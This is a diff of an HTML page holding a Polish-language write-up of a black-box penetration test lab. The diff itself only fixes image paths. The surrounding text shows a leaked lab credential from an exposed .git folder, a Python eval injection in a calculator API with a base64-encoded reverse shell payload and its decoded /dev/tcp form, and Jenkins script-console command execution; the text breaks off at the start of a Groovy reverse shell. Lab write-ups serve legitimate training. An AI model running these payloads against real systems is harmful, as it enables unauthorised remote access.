@@ -261,7 +261,7 @@
 <hr>
 <h1 id="black-box-penetration-test-2---20062022-r">Black-Box Penetration Test 2 - 20.06.2022 r.<a hidden class="anchor" aria-hidden="true" href="#black-box-penetration-test-2---20062022-r">#</a></h1>
 <p>Na start otrzymujemy link do strony <a href="http://online-calc.com">http://online-calc.com</a>.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220620015012.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220620015012.png" alt=""  />
 </p>
 <p>Po przejściu ukazuje się jedynie strona domyślna Apache2.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# ping online-calc.com
@@ -410,19 +410,19 @@ by Ben <span style="color:#e6db74">&#34;epi&#34;</span> Risher 邏              
 <p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220620020133.png" alt=""  />
 </p>
 <p>Podstrona <code>/console</code> zdaje się mieć zabezpieczenie poprzez PIN. Sprawdziłem jak wpisanie przykładowego pinu i wciśnięcię <code>Confirm PIN</code> widać w <code>BurpSuite</code>.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220620020358.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220620020358.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220620020440.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220620020440.png" alt=""  />
 </p>
 <p>Zmieniłem jedną cyfre w pinie. Parametr <code>s</code> nie zmienił się. Postanowiłem spróbować bruteforca, ponieważ serwer daje wyraźny response o niepoprawnym pinie.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220620020653.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220620020653.png" alt=""  />
 </p>
 <h3 id="git"><code>/.git</code><a hidden class="anchor" aria-hidden="true" href="#git">#</a></h3>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220620125947.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220620125947.png" alt=""  />
 </p>
 <p>Są pewne dane dostępu <code>jeremy:diamonds</code>.</p>
 <p>Jest również wzmianka o dodatkowym URLu. Ponieważ jest to <code>remote orgin</code>, prawdopodobnie możemy go sklonować.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220620133221.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220620133221.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# git clone http://online-calc.com/projects/online-calc
 Cloning into <span style="color:#e6db74">&#39;online-calc&#39;</span>...
@@ -440,23 +440,23 @@ drwxr-xr-x <span style="color:#ae81ff">8</span> root root <span style="color:#ae
 </code></pre></div><p>Plik <code>API.py</code> zawiera informacje o działaniu kalkulatora z portu <code>5000</code>.</p>
 <h3 id="test-aplikacji-kalkulatora-burpsuite">Test aplikacji kalkulatora BurpSuite<a hidden class="anchor" aria-hidden="true" href="#test-aplikacji-kalkulatora-burpsuite">#</a></h3>
 <p>Po wykonaniu testowego &ldquo;zapytania&rdquo; otrzymałem w Burpie taki request.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220620135411.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220620135411.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220620142508.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220620142508.png" alt=""  />
 </p>
 <p>Prawdopodobnie chodzi o parametr <code>expr</code>. Dozwolone znaki to <code>0123456789+-*/%.()&quot;</code>. Niestety po zbyt wielu próbach jest komunikat <code>Access Denied&quot;: &quot;Too many requests.</code>, zatem zawaansowany sqlmap nie wchodzi w grę.</p>
 <p>Można powiedzieć, że uzyskałem <code>Command Injection</code>. Zauważyłem, że przy wpisywaniu funkcji Pythona, API wyrzuca komunikaty. Można to wykorzystać importując bibliotekę <code>os</code>, która pozwala na wykonywanie prostych komend.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220620182546.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220620182546.png" alt=""  />
 </p>
 <p>Rozumiałem, że muszę oszukać system, by przechwycić &ldquo;nieporządane&rdquo; znaki do payloada. Dodałem wszystkie duże i małe litery oraz inne do dozwolonych znaków. W ten sposób program &ldquo;przepuszcza&rdquo; mój request.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621000817.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621000817.png" alt=""  />
 </p>
 <p>Ostateczny payload wygląda tak:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{<span style="color:#e6db74">&#34;expr&#34;</span>:<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).system(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuODAuOC4yLzkwMDEgMD4mMSIK | base64 -d | bash&#39;)&#34;</span>}
 </code></pre></div><p>Wykonuje on poniższy kod:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">bash <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/192.80.8.2/9001 0&gt;&amp;1&#34;</span>
 </code></pre></div><p>Nasłuchiwanie na porcie <code>9001</code> i uruchomienie requesta w <code>BurpSuite</code> powoduje otrzymanie shella.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621000930.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621000930.png" alt=""  />
 </p>
 <p>W folderze roota nie było flagi. Znalazłem ją poprzez <code>find</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . -name flag
@@ -500,16 +500,16 @@ Not shown: <span style="color:#ae81ff">999</span> closed tcp ports <span style="
 PORT     STATE SERVICE
 8080/tcp open  http-proxy
 </code></pre></div><p>Teraz po tych wszystkich operacjach, gdy wejdziemy w proxy przeglądarki i ustawimy na <code>127.0.0.1</code> port z proxychaina czyli <code>9050</code>, możemy wejść na port <code>8080</code> z &ldquo;obcej&rdquo; sieci.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621023527.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621023527.png" alt=""  />
 </p>
 <h2 id="panel-jenkins">Panel Jenkins<a hidden class="anchor" aria-hidden="true" href="#panel-jenkins">#</a></h2>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621023731.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621023731.png" alt=""  />
 </p>
 <p>Wersja <code>Jenkins ver. 2.225</code>.</p>
 <p>Prosty command injection w Jenkinsie.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">cmd=&#39;whoami&#39;
 println cmd.execute().text
-</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621031344.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621031344.png" alt=""  />
 </p>
 <p>Otrzymanie shella jest równie proste.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">int port=5555;
